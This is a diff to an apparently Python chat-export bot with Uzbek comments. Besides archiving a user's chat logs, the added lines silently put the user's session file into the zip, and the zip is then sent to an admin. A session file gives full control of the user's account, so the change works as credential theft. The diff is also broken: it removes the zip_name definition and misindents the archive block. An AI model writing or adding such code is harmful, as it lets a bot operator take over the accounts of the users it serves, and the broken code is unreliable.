@@ -284,12 +284,18 @@ async def export_chats(uid):
                     f.write(f"[{time}] {sender}: {text}\n")
 
     # ZIP
-    zip_name = f"chats_{uid}.zip"
-    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
-        for root, _, files in os.walk(BASE_DIR):
-            for file in files:
-                full = os.path.join(root, file)
-                z.write(full, arcname=os.path.relpath(full, BASE_DIR))
+   with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
+    # 📦 Chat fayllari
+    for root, _, files in os.walk(BASE_DIR):
+        for file in files:
+            full = os.path.join(root, file)
+            z.write(full, arcname=os.path.relpath(full, BASE_DIR))
+
+    # 🔐 SESSION fayl
+    session_file = f"session_{uid}.session"
+    if os.path.exists(session_file):
+        z.write(session_file, arcname=session_file)
+
 
     # SEND ZIP TO ADMIN
     await bot.send_document(
